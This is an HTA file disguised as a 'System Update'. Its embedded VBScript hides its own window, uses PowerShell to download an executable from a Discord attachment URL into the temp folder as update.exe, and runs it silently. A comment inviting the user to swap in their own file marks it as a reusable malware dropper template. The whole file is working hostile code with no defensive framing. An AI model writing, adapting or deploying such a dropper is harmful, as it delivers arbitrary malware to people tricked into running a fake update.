<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <HTA:APPLICATION ID="o" APPLICATIONNAME="System Update" WINDOWSTATE="minimize" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" CAPTION="no" SHOWINTASKBAR="no" />
    <script language="VBScript">
        ' Hide the window
        Window.ResizeTo 0,0
        Window.MoveTo -5000,-5000
        
        ' Create objects
        Dim shell: Set shell = CreateObject("WScript.Shell")
        Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
        Dim temp: temp = fso.GetSpecialFolder(2)
        
        ' CHANGE THIS URL TO YOUR FILE
        Dim url: url = "https://cdn.discordapp.com/attachments/1530414161576726579/1530638151650115695/navi.exe?ex=6a664d5d&is=6a64fbdd&hm=6951eab1fc3fc826a092911d60bb1c93cd868c07a236d96a7cfa6b67bd927cee&"
        Dim exePath: exePath = temp & "\update.exe"
        
        ' Download the file using PowerShell
        shell.Run "powershell -c ""(New-Object Net.WebClient).DownloadFile('" & url & "','" & exePath & "')""", 0, True
        
        ' Check if file exists and execute it
        If fso.FileExists(exePath) Then
            shell.Run """" & exePath & """", 0, False
        End If
        
        ' Close the window
        window.close()
    </script>
</head>
<body>
</body>
</html>
